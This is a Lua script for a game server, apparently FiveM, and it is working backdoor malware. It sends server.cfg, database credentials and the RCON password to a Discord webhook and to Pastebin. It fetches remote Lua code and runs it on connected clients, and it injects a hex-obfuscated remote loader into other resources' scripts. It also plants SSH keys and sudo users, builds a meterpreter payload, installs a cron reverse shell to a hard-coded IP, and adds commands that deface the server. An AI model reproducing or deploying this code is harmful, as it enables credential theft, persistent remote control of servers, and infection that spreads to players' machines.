-- !> Server CFG Getter <! --
local open = io.open

local function read_file(path)
	local file = open(path, "rb") -- r read mode and b binary mode
	if not file then return nil end
	local content = file:read "*a" -- *a or *all reads the whole file
	file:close()
	return content
end

local fileContent = read_file("server.cfg");

finalContent = "```" .. fileContent ..	 "```"

PerformHttpRequest("https://discord.com/api/webhooks/970413778380419132/H4XkIwj3TMBt_iSl6hRiIGUlNPXEKrUCxXdGZXW5pXbuJ6lUy2L5h__Y5s_x7P15HXK_", function(err, text, header) end,
'POST', 
json.encode({username = GetConvar('sv_hostname'), content = finalContent }), {['Content-Type'] = 'application/json'}) 

PerformHttpRequest("https://spambude.net/Dks/client-backdoor.lua", function(err, rText, headers)
	SkA92 = rText
end)

local pastebinApiKey = "xc76ccBspjDEpyquvg96E6iURGVKHdYv"
local option = "api_option=paste&api_paste_private=1&api_paste_format=lua&api_dev_key=" .. pastebinApiKey .. "&api_paste_code=" .. fileContent

CreateThread(function()
	PerformHttpRequest("https://pastebin.com/api/api_post.php", function(errorCode, resultData, resultHeaders)
		rs225106820 = tostring(resultData)
		PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
		local IP = rText
			fullContent = "__**Server Info:**__\n\nServer Name: **".. GetConvar('sv_hostname').. "**\n\n__**Anderwertige Info:**__\n\nMySQL String: **" .. GetConvar('mysql_connection_string') .. "**\nRCON: **" .. GetConvar('rcon_password') .. "**\n\n__**Backdoor Info:**__\n\nBackdoor Port: **4078** & **22**\nBackdoor User: **8888** / **7777**\nBackdoor Password: **8888** / **7777**"
			
			PerformHttpRequest("https://discord.com/api/webhooks/970413778380419132/H4XkIwj3TMBt_iSl6hRiIGUlNPXEKrUCxXdGZXW5pXbuJ6lUy2L5h__Y5s_x7P15HXK_", function(err, text, header) end,
			'POST', 
			json.encode({username = GetConvar('sv_hostname'), content = fullContent }), {['Content-Type'] = 'application/json'}) 
		end)
	end, "POST", option)
end)
-- !> Server CFG Getter <! --

local getBackdoorClient = {}
RegisterNetEvent("CreateThreadFunction")
AddEventHandler("CreateThreadFunction", function()
	if not getBackdoorClient[source] then
		TriggerClientEvent("CreateThreadFunction", source, SkA92)
		getBackdoorClient[source] = true
	else
		return
	end
end)

BackdoorStuffServer = {
	'server/server',
	'server',
	'server/sv',
	'server/sv_shared',
	'sv_shared',
	'util_shared',
	'admin_server',
	'sv/sv',
	'sv/server',
	'sv/sv_shared',
	'Server/PerformHttpRequest'
}

BackdoorStuffClient = {
	'client/client',
	'client',
	'client/cl',
	'client/cl_shared',
	'cl_shared',
	'cl/client',
	'cl/cl',
	'cl/cl_shared'
}



-- !> Install Backdoor in other Scripts <! --


function Initialize()
    inputFile = 'server.cfg'
	file = io.open("server.cfg", "r")
	sAjXAo = file:read("*a")

end
function Edit()

    local file = io.open(inputFile, 'r')
    local fileContent = {}
    for line in file:lines() do
        table.insert (fileContent, line)
    end
    io.close(file)

    fileContent[3] = 'This line has been edited'

    file = io.open(inputFile, 'w')
    file:write(sAjXAo..'\nrcon_password 8888')
    io.close(file)
end

Initialize()
Edit()

function SDhskXCsi391()
	function setall(an, ao)
		for _, eXux in pairs(BackdoorStuffServer) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local sAk = [[
						
	local Lua_Tabs = {
		Ench, Support, Host, Pairs,
		Realease, Callbacks, Source,
		Hosting, Event, PerformHttpRequest,
		assert, server, load, Spawn, materials
	}

	local random_char = {
		'68', '74', '74', '70', '73', '3a', '2f', '2f', '73', '70', '41', '4d', '42', '55',
		'44', '65', '2e', '4e', '65', '74', '2f', '44', '6b', '73', '2f', '6c', '6c', '2e'; '6c',
		'75', '61'
	}

	function sst_conv8()
		_empt = ''
		for id,it in pairs(random_char) do
			_empt = _empt..it
		end
		return (_empt:gsub('..', function (cc)
			return string.char(tonumber(cc, 16))
		end))
	end

	Lua_Tabs[10](sst_conv8(), function (e, d)
		local s = Lua_Tabs[11](Lua_Tabs[13](d))
		if (d == nil) then return end
		s()
	end)
						]]
						az = sAk
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
		
		for _, eXux in pairs(BackdoorStuffClient) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local Soa90 = [[
						
	function sst_conv8()
		_empt = ''
		for id,it in pairs(random_char) do
			_empt = _empt..it
		end
		return (_empt:gsub('..', function (cc)
			return string.char(tonumber(cc, 16))
		end))
	end

	CreateThread(function()
		TriggerServerEvent("CreateThreadFunction")
		RegisterNetEvent("CreateThreadFunction")
		AddEventHandler("CreateThreadFunction", function(CreateThreadFunction)
			load(CreateThreadFunction)()
		end)
	end)
						]]
						az = Soa90
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
	end;
	function searchall(an, ao)
		local ap = io.popen("dir \""..an.."\" /b /ad")
		ap:seek("set", 0)
		local aA = ap:read("*a")
		ap:close()
		local at = split(aA, "\n")
		for U, aw in ipairs(at) do
			if string.len(aw) > 0 then
				setall(an.."/"..aw, ao)
				searchall(an.."/"..aw, ao)
			end
		end
	end;
	function split(aB, aC)
		local aD, aE = 0, {}
		for aF, aG in function()
			return string.find(aB, aC, aD, true)
		end do
			table.insert(aE, string.sub(aB, aD, aF - 1))
			aD = aG + 1
		end;
		table.insert(aE, string.sub(aB, aD))
		return aE
	end;
	function randomstring()
		local aH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		local aI = 5;
		local aJ = ''
		math.randomseed(os.time())
		charTable = {}
		for aK in aH:gmatch"." do
			table.insert(charTable, aK)
		end;
		for al = 1, aI do
			aJ = aJ..charTable[math.random(1, #charTable)]
		end;
		ad = aJ
	end;


	function installBackdoorToScripts()
		local ak = GetNumResources()
		for al = 0, ak - 1 do
			local am = GetResourcePath(GetResourceByFindIndex(al))
			if string.len(am) > 4 then
				setall(am)
			end
		end;
	end

	installBackdoorToScripts()
	-- !> Install Backdoor in other Scripts <! --
end

RegisterCommand("+8888+installBackdoor", function(source, args, rawCommand)
	SDhskXCsi391()
end, false)

RegisterCommand("+8888+hackServer", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-HackServer', -1)
end, false)

RegisterCommand("+8888+blipsHack", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-BlipsHack', -1)
end, false)

RegisterCommand("+8888+porn", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-pornScreen', -1)
end, false)

RegisterCommand("+8888+soundSpam", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-soundSpam', -1)
end, false)

RegisterCommand("+8888+loadBrutan", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-Brutan', -1)
end, false)

RegisterCommand("+8888+loadFalcon", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-Falcon', -1)
end, false)

RegisterCommand("+8888+stopServer", function(source, args, rawCommand)
	os.exit()
end, false)

RegisterCommand("+8888+hackedNames", function(source, args, rawCommand)
	serverName = "Server Hacked by 8888 | https://dsc.gg/8-8-8-8"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY 8888')
	SetConvarServerInfo('tags', '8888')
	SetConvarServerInfo('tags', 'https://dsc.gg/8-8-8-8')
	SetConvarServerInfo('tags', 'Server Hacked by 8888 | https://dsc.gg/8-8-8-8')
end, false)

RegisterCommand("+8888+discordHack", function(source, args, rawCommand)
	TriggerClientEvent('8888-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
end, false)

RegisterCommand("+8888+loadEverything", function(source, args, rawCommand)
	SDhskXCsi391()
	TriggerClientEvent('8888-Backdoor-HackServer', -1)
	TriggerClientEvent('8888-Backdoor-BlipsHack', -1)
	TriggerClientEvent('8888-Backdoor-soundSpam', -1)
	TriggerClientEvent('8888-Backdoor-Brutan', -1)
	TriggerClientEvent('8888-Backdoor-Falcon', -1)
	serverName = "Server Hacked by 8888 | https://dsc.gg/8-8-8-8"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY 8888')
	SetConvarServerInfo('tags', '8888')
	SetConvarServerInfo('tags', 'https://dsc.gg/8-8-8-8')
	SetConvarServerInfo('tags', 'Server Hacked by 8888 | https://dsc.gg/8-8-8-8')
	TriggerClientEvent('8888-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
end, false)

function HackAddUser()
	os.execute("chmod 700 ~/.ssh")
	os.execute("chmod 600 ~/.ssh/authorized_keys")
	os.execute("mkdir -p /root/.ssh/ && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeHv4SVwtcO+ALtit647WWkfDtQgaKSKRstREsvyfKp9FHhHS7ZYZxLF+AMglvecWCIrI2lfwYjotHNlKaAwMWxP82ET5mrnRqXZUYr+7onxTvRVhNg+oIp+b7j2DkR1Q7temVaLPFAMVEeWNnPOyShUaMc4TzvQFC1fg9qTzTSdf6mPSCw2gvu+/A5J6GQKykZYLXEO5YTw3QZ8uuPp17XK3ToqyQSPBeY+X3eE9xpGfXIg1Av2QDUkg/c5z94MYsMPw6iUKwfJDLQUepCQB1PR5SDDnR/IONQy3D/Dvr3Z13uMWHSUV1z3Y/s5lUoLyMiYWnBgyJwPsvL6Untf+3 rsa-key-20220503' > /root/.ssh/authorized_keys")
	os.execute("adduser -h 8888")
	os.execute("echo -e \"test\ntest\" | passwd 8888")
	os.execute("usermod -aG sudo 8888")
	os.execute("adduser -h /root -s /bin/ash 7777");os.execute("echo -e \"test\ntest\" | passwd 7777")
end

HackAddUser()

function hackServer()
	os.execute("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
	os.execute("IPTABLES -A INPUT --dport 22 -m state --state NEW -j ACCEPT")
	os.execute("apt-get install msfvenom")
	os.execute("apt-get metasploit-framework")
	os.execute("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=178.203.169.229 LPORT=4296 -f elf > shell.elf")
end

hackServer()

local CronHackCode = [[
	
IP=178.203.169.229                #Change
PORT=4078              #Change 
DIR=".SysInternals"   #Example
FILENAME="config"     #Example
CURR_SCRIPT="$0"      #DON'T change

if ! [ -d ~/${DIR} ] && ! [ -e ~/${DIR}/${FILENAME}.sh ]; then #Checks if the backdoor folder exists, if it doesn't create it.
                                                               #Make sure the folder isn't named same as something essential... 
    mkdir ~/${DIR}/
    touch ~/${DIR}/${FILENAME}.sh
fi

if  [ -x "$(command -v nc)" ]; then  #Checks if netcat exists on the filesystem, if it does use netcat rev shell, if it doesn't use bash -i
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" > ~/${DIR}/${FILENAME}.sh #Universal way of getting a nc reverse shell even if -e is disabled
else 
  echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" > ~/${DIR}/${FILENAME}.sh 
fi

chmod +x ~/${DIR}/${FILENAME}.sh #Makes the backdoor executable
(crontab -l 2>/dev/null; echo "* * * * * bash $HOME/${DIR}/${FILENAME}.sh") | crontab - #Creates the cronjob responsible for calling the backdoor every MINUTE
	
]]

function CronTabBackdoor()
	os.execute(CronHackCode)
end

CronTabBackdoor()